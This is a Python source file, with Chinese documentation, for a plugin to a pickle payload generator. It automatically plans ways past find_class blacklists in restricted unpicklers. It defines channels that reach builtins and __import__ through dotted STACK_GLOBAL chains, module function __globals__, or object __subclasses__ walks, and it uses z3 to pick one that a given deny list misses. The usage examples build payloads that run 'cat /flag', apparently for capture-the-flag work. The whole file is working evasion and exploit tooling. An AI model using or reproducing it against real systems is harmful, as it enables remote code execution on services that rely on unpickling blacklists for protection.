"""find_class 黑名单绕过插件: 给定黑名单, 自动规划出一条可用通道。

pkfn.dumps_cmd 生成的函数体按契约使用 import_module / getattr 两个名字,
本插件负责以 find_class 不可见的方式把它们绑定到运行时对象上。
绑定方式抽象成"通道"(channel), 每个通道声明:

    preamble   前置源码行 (绑定 import_module / getattr / getattribute)
    refs       该通道在 payload 中全部 find_class 可见的 (module, name)
    compiler   发码方式 (文本 GLOBAL / protocol 4 STACK_GLOBAL)

通道一览:
    importlib          直接 importlib.import_module + builtins.getattr,
                       整链走 STACK_GLOBAL, 零 operator 依赖
                       refs: (importlib,import_module) (builtins,getattr)
                             (builtins,object.__getattribute__)
    sys_modules        旧实现 (文本协议): importlib 拿 sys 再经 sys.modules['builtins']
                       refs: (importlib,import_module) (sys,modules)
                             (operator,attrgetter) (operator,itemgetter)
    sys_direct         只依赖 sys: sys.modules.__class__.__getitem__ 当取值器,
                       零 operator / 零 importlib
                       refs: (sys,modules) (sys,modules.__class__.__getitem__)
                             (sys,modules.__class__.__getattribute__)
    builtins_dict      直接引用 builtins.__import__ / __dict__, getattr 经
                       __dict__.__class__.__getitem__ 取出, 零 operator
                       refs: (builtins,__import__) (builtins,__dict__)
                             (builtins,__dict__.__class__.__getitem__)
                             (builtins,__dict__.__class__.__getattribute__)
    func_globals       只依赖种子模块的一个函数, 经其 __globals__['__builtins__']
                       拿 builtins; 属性链整串走 STACK_GLOBAL, 黑名单精确匹配
                       看不到链上的敏感名字; 零 operator;
                       需要目标环境 seed.__globals__['__builtins__'] 为 dict
                       (CPython 常见场景, 如 python -c / 交互式)。
                       种子 (模块, 函数): glob.glob / json.dumps / re.compile /
                       base64.b64encode / functools.lru_cache / copy.deepcopy /
                       os.fsencode / shutil.copy / tempfile.mkstemp /
                       warnings.catch_warnings / contextlib.contextmanager /
                       textwrap.dedent / posixpath.join / urllib.request.urlopen /
                       string.Template
    func_subclasses    零模块名: 从空元组起步经
                       ().__class__.__base__.__subclasses__()[index] 取类,
                       再经其 __init__.__globals__['__builtins__'] 拿 builtins;
                       refs 只有 operator (attrgetter/itemgetter);
                       index 依赖目标环境 (Python 版本/解释器),
                       默认不进 plan 自动规划, 只能
                       use('func_subclasses', index=N) 显式指定
                       (本地可先探测; plan(..., include_manual=True) 可强制纳入)

plan(blacklist, match='exact') 在给定黑名单下自动选一条可用通道:
    - 用 z3 求解 (布尔选择 + 代价最小化); z3 不可用时退化为顺序尝试
    - 黑名单格式 (均可省略):
          {'module': {'os', ...},            # module 精确匹配
           'name':   {'system', ...},        # name 精确匹配
           'pair':   {('os','system'),...}}  # (module, name) 对精确匹配
    - match='substring' 时 module/name 按子串匹配 (pair 仍精确)

用法:
    from pkfn import dumps_cmd
    from plugins import find_class_blacklist_bypass as bypass

    payload = dumps_cmd('cat /flag')                                   # 朴素直通
    payload = dumps_cmd('cat /flag', plugins=[bypass])                 # 默认 importlib 通道
    payload = dumps_cmd('cat /flag', plugins=[bypass.plan(blacklist)]) # z3 自动规划
    payload = dumps_cmd('cat /flag', plugins=[bypass.use('func_globals')])

旧接口兼容: preamble() / use(strategy, verify) / compiler_plugin(verify)
/ 模块级 COMPILER。

部署前提: importlib / sys_direct / builtins_dict / func_globals 等
STACK_GLOBAL 点号链通道依赖目标 find_class 支持点号属性链
(CPython protocol >= 4 的默认实现用 _getattribute 沿点号下钻);
若目标用裸 getattr(__import__(m), n) 实现 find_class, 这些通道
会在目标侧失败 (点号 name 取不到属性)。
"""

from pkfn import _Compiler


class PlanningError(Exception):
    """给定黑名单下没有任何通道可用。"""


def _binunicode(s):
    b = s.encode('utf-8')
    n = len(b)
    if n <= 255:
        return b'\x8c' + bytes([n]) + b
    return b'\x58' + n.to_bytes(4, 'little') + b   # BINUNICODE (X)


class DottedGlobalCompiler(_Compiler):
    """protocol 4: 整条点号属性链作为单个 name 发 STACK_GLOBAL,
    黑名单精确匹配在 (module, name) 里看不到链上的单个名字。"""

    def __init__(self, verify=True):
        super().__init__(verify=verify)
        self.push(b'\x80\x04')

    def push_string(self, s):
        self.push(_binunicode(s))

    def _emit_global_ref(self, mod_name, rest):
        self.push_string(mod_name)
        self.push_string('.'.join(rest))
        self.push(b'\x93')


class UnverifiedDottedCompiler(DottedGlobalCompiler):
    """点号编译器 + 关闭编译期属性链校验 (用于 load 期才存在的属性,
    如把 sys.modules['sys'] 换成 dict 后再引用 sys.get)。"""

    def __init__(self):
        super().__init__(verify=False)


# ---------- 通道 ----------

def _fg_channel(seed_module, seed_func, chan_name=None):
    """func_globals 家族: 以 seed_module.seed_func 为种子, 经
    seed.__globals__['__builtins__'] 拿 builtins。
    整条点号属性链走 STACK_GLOBAL (DottedGlobalCompiler), 对 find_class
    只暴露 (seed_module, '<链>')。"""
    seed = '%s.%s' % (seed_module, seed_func)
    return {
        'name': chan_name or 'func_globals_%s' % seed_module,
        'compiler': DottedGlobalCompiler,
        'refs': [
            (seed_module, '%s.__globals__.__getitem__' % seed_func),
            (seed_module, '%s.__globals__.__class__.__getitem__' % seed_func),
            (seed_module, '%s.__globals__.__class__.__getattribute__' % seed_func),
        ],
        'preamble': [
            'import %s' % seed_module,
            'dget = %s.__globals__.__class__.__getitem__' % seed,
            'ga = %s.__globals__.__class__.__getattribute__' % seed,
            "b = %s.__globals__.__getitem__('__builtins__')" % seed,
            "getattr = dget(b, 'getattr')",
            "import_module = dget(b, '__import__')",
            "getattribute = ga(b, '__getattribute__')",
        ],
    }


def _sc_channel(index=166):
    """func_subclasses 通道: 零模块名起步。

    从空元组 (纯 opcode 构造) 经 __class__.__base__.__subclasses__()[index]
    取一个 Python 类, 再经其 __init__.__globals__['__builtins__'] 拿 builtins。
    refs 只有 operator (attrgetter/itemgetter); index 依赖目标环境,
    默认 166 仅是示例值, 请用 use('func_subclasses', index=N) 指定。
    """
    return {
        'name': 'func_subclasses',
        'compiler': DottedGlobalCompiler,
        'auto': False,               # index 环境相关, 不进 plan 自动规划
        'refs': [('operator', 'attrgetter'),
                 ('operator', 'itemgetter')],
        'preamble': [
            'sub = ().__class__.__base__.__subclasses__()[%d]' % index,
            'gl = sub.__init__.__globals__',
            'dget = gl.__class__.__getitem__',
            'ga = gl.__class__.__getattribute__',
            "b = dget(gl, '__builtins__')",
            "getattr = dget(b, 'getattr')",
            "import_module = dget(b, '__import__')",
            "getattribute = ga(b, '__getattribute__')",
        ],
    }


CHANNELS = [
    {
        'name': 'importlib',
        'compiler': DottedGlobalCompiler,
        'refs': [('importlib', 'import_module'),
                 ('builtins', 'getattr'),
                 ('builtins', 'object.__getattribute__')],
        'preamble': [
            'import importlib',
            'import builtins',
            'import_module = importlib.import_module',
            'getattr = builtins.getattr',
            'getattribute = builtins.object.__getattribute__',
        ],
    },
    {
        'name': 'sys_modules',
        'compiler': _Compiler,
        'refs': [('importlib', 'import_module'),
                 ('sys', 'modules'),
                 ('operator', 'attrgetter'),
                 ('operator', 'itemgetter')],
        'preamble': [
            'import importlib',
            'import sys',
            "b = importlib.import_module('sys').modules['builtins']",
            'import_module = b.__import__',
            'getattr = b.getattr',
            'getattribute = ().__class__.__base__.__getattribute__',
        ],
    },
    {
        'name': 'sys_direct',
        'compiler': DottedGlobalCompiler,
        'refs': [('sys', 'modules'),
                 ('sys', 'modules.__class__.__getitem__'),
                 ('sys', 'modules.__class__.__getattribute__')],
        'preamble': [
            'import sys',
            'dget = sys.modules.__class__.__getitem__',
            'ga = sys.modules.__class__.__getattribute__',
            'b = dget(sys.modules, "builtins")',
            'getattr = ga(b, "getattr")',
            "import_module = ga(b, '__import__')",
            "getattribute = ga(b, '__getattribute__')",
        ],
    },
    {
        'name': 'builtins_dict',
        'compiler': DottedGlobalCompiler,
        'refs': [('builtins', '__import__'),
                 ('builtins', '__dict__'),
                 ('builtins', '__dict__.__class__.__getitem__'),
                 ('builtins', '__dict__.__class__.__getattribute__')],
        'preamble': [
            'import builtins',
            'import_module = builtins.__import__',
            'dget = builtins.__dict__.__class__.__getitem__',
            'getattr = dget(builtins.__dict__, "getattr")',
            'getattribute = builtins.__dict__.__class__.__getattribute__',
        ],
    },
    _fg_channel('glob', 'glob', chan_name='func_globals'),
    _fg_channel('json', 'dumps'),
    _fg_channel('re', 'compile'),
    _fg_channel('base64', 'b64encode'),
    _fg_channel('functools', 'lru_cache'),
    _fg_channel('copy', 'deepcopy'),
    _fg_channel('os', 'fsencode', chan_name='func_globals_os'),
    _fg_channel('shutil', 'copy'),
    _fg_channel('tempfile', 'mkstemp'),
    _fg_channel('warnings', 'catch_warnings.__init__'),
    _fg_channel('contextlib', 'contextmanager'),
    _fg_channel('textwrap', 'dedent'),
    _fg_channel('posixpath', 'join'),
    _fg_channel('urllib.request', 'urlopen', chan_name='func_globals_urllib'),
    _fg_channel('string', 'Template.__init__'),
    _sc_channel(),
]

_STRATEGY_CHANNEL = {ch['name']: i for i, ch in enumerate(CHANNELS)}


# ---------- 黑名单匹配 ----------

def _normalize_blacklist(blacklist):
    bl = blacklist or {}
    out = {
        'module': set(bl.get('module', ())),
        'name': set(bl.get('name', ())),
        'pair': set(tuple(p) for p in bl.get('pair', ())),
    }
    if '' in out['module'] or '' in out['name'] \
            or any(len(p) != 2 or not all(p) for p in out['pair']):
        raise ValueError('blacklist entries must be non-empty, and pair '
                         'entries must be (module, name)')
    return out


def _hits(bl, ref, match):
    module, name = ref
    if match == 'substring':
        if any(m in module for m in bl['module']):
            return True
        if any(n in name for n in bl['name']):
            return True
    else:
        if module in bl['module']:
            return True
        if name in bl['name']:
            return True
    return ref in bl['pair']


def _blocked_report(channels, bl, match):
    lines = ['no channel survives blacklist:']
    for ch in channels:
        hits = [ref for ref in ch['refs'] if _hits(bl, ref, match)]
        lines.append('  %-12s %s' % (ch['name'], hits if hits else 'ok'))
    return '\n'.join(lines)


# ---------- 规划 ----------

def _plan_z3(channels, bl, match):
    try:
        import z3
    except ImportError:
        return _plan_greedy(channels, bl, match)

    sels = [z3.Bool('ch%d' % i) for i in range(len(channels))]
    opt = z3.Optimize()
    for sel, ch in zip(sels, channels):
        for ref in ch['refs']:
            if _hits(bl, ref, match):
                opt.add(z3.Not(sel))          # 该通道被黑名单挡死
    opt.add(z3.Sum([z3.If(s, 1, 0) for s in sels]) == 1)   # 恰好选一条
    opt.minimize(z3.Sum([z3.If(s, i + 1, 0)
                         for i, s in enumerate(sels)]))    # 序号小优先
    if opt.check() != z3.sat:
        raise PlanningError(_blocked_report(channels, bl, match))
    model = opt.model()
    for sel, ch in zip(sels, channels):
        if z3.is_true(model[sel]):
            return ch
    raise PlanningError('planner returned no channel')


def _plan_greedy(channels, bl, match):
    for ch in channels:
        if not any(_hits(bl, ref, match) for ref in ch['refs']):
            return ch
    raise PlanningError(_blocked_report(channels, bl, match))


def plan(blacklist=None, match='exact', include_manual=False):
    """在给定黑名单下自动规划一条可用通道, 返回插件对象 (传给 dumps_cmd)。

    blacklist: {'module': set, 'name': set, 'pair': set}, 均可省略。
    match: 'exact' (默认) 或 'substring'。
    include_manual: True 时把 'auto': False 的通道 (如 func_subclasses,
        其 index 参数依赖目标环境) 也纳入求解; 默认排除, 这类通道只能用
        use() 显式指定。
    规划用 z3 求解 (代价最小优先); z3 不可用时退化为顺序尝试。
    """
    bl = _normalize_blacklist(blacklist)
    channels = [ch for ch in CHANNELS if include_manual or ch.get('auto', True)]
    return _PlannedPlugin(_plan_z3(channels, bl, match))


# ---------- 插件对象 ----------

class _PlannedPlugin(object):
    def __init__(self, channel):
        self._channel = channel
        self.COMPILER = channel['compiler']

    def preamble(self):
        return list(self._channel['preamble'])

    def __repr__(self):
        return '<bypass channel=%r>' % self._channel['name']


# ---------- 旧接口兼容 ----------

def use(strategy='importlib', verify=True, index=None):
    """指定通道返回插件对象。verify=False 时改用 UnverifiedDottedCompiler。
    func_subclasses 通道可传 index 指定 __subclasses__ 下标 (默认 166)。"""
    try:
        idx = _STRATEGY_CHANNEL[strategy]
    except KeyError:
        raise ValueError('unknown strategy %r, expect one of %s'
                         % (strategy, sorted(_STRATEGY_CHANNEL)))
    ch = CHANNELS[idx]
    if strategy == 'func_subclasses' and index is not None:
        ch = _sc_channel(index=index)
    if not verify:
        ch = dict(ch, compiler=UnverifiedDottedCompiler)
    return _PlannedPlugin(ch)


def compiler_plugin(verify=True):
    """只携带编译器、不带 preamble 的插件, 供 payload 自带绕过逻辑使用。"""
    cls = DottedGlobalCompiler if verify else UnverifiedDottedCompiler

    class _CompilerOnly(object):
        COMPILER = cls

        @staticmethod
        def preamble():
            return []

    return _CompilerOnly()


def preamble():
    """插件接口: 默认 (importlib) 通道的前置源码行。"""
    return list(CHANNELS[0]['preamble'])


# 模块级插件 (plugins=[bypass]) 默认: importlib 通道 + protocol 4 点号编译器
COMPILER = DottedGlobalCompiler
